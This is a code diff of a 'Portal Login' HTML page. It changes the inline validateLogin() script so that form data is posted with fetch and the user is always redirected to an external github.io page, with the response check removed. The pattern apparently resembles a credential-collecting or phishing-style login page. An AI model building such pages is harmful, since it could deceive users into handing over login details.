@@ -178,7 +178,7 @@ a {
     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
      <title>Portal Login</title>
     <script>
-        function validateLogin() {
+function validateLogin() {
     // Check if the user agreed to the terms
     var agreed = document.getElementById("agreement_agree").checked;
 
@@ -207,10 +207,8 @@ a {
             },
             body: JSON.stringify(formData),
         })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
+        .then(() => {
+            // Redirect after initiating the fetch request
             window.location.href = 'https://webhost6.github.io/index.html';
         })
         .catch(error => {
@@ -222,7 +220,6 @@ a {
         document.getElementById("failreason").textContent = "Username must start with two numbers.";
     }
 }
-
     </script>
 </head>
 
